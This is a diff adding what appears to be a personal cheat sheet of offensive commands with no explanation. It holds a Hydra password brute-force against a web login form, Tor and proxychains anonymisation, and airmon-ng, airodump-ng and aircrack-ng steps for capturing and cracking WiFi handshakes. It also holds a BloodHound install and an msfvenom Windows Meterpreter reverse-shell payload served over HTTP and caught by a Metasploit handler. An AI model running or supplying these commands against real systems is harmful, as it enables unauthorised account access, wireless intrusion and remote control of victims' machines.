@@ -1,0 +1,46 @@
+﻿hydra -l Noway -P pass.txt testasp.vulnweb.com http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^USER^&tfUPass=^P ASS^:S=logout" -vV -f 
+
+
+http://testasp.vulnweb.com/Login.asp?RetURL=/Default.asp?
+
+
+ /etc/proxychains.conf
+
+
+service tor start
+
+
+proxychains firefox google.com
+
+
+iwconfig
+sudo airmon-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng wlan0mon -c 7 –bssid bruh -w targetfile
+aircrack-ng -w wordlist.txt targetfile-02.cap
+/usr/share/wordlists/
+
+
+http://testasp.vulnweb.com/Login.asp?RetURL=/Default.asp?
+
+
+
+
+bloodhound | Kali Linux Tools
+
+
+https://github.com/BloodHoundAD/BloodHound-Tools
+
+
+sudo apt install -y bloodhound
+
+
+DBCreator.py fails during generate, cleardb, etc. · Issue #22 · BloodHoundAD/BloodHound-Tools (github.com)
+
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP -f exe > bruh.exe
+python -m SimpleHTTPServer
+Use exploit/multi/handler
+Set windows/meterpreter/reverse_tcp
+Set lhost=3442.42423.42
+exploit
